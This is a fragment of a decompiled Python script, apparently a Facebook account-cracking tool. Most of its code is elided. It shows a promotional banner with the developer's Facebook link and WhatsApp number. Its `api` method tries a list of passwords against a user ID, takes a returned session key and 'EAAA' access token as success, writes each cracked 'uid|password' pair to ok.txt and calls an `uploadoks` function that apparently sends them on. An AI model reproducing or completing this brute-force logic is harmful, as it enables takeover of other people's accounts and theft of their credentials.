# Decompile by : Tajul Islam Rabbi TR Tacknolagy 360
...
def helpnote():
	...
	exit(" [*] FACEBOOK : https://www.facebook.com/profile.php?id=100072425385396")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN WHATSAPP >> +01999014197")
	subprocess.check_output(["am", "start", "https://wa.me/+01999014197"])
...
class Main:
 ...
 > \033[0;92mDEVELOPER     : Tr tacknolagy 360
 > \033[0;95mFACEBOOK ID   : Tajul Islam Rabbi 
 > \033[0;41mWHATSAPP      : +0199901****
 \033[0;96m> YOUTUBE       : TR Tacknolagy 360
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [RABBI-OK😍] %s|%s\n"%(uid, pw))
				uploadoks()
				break
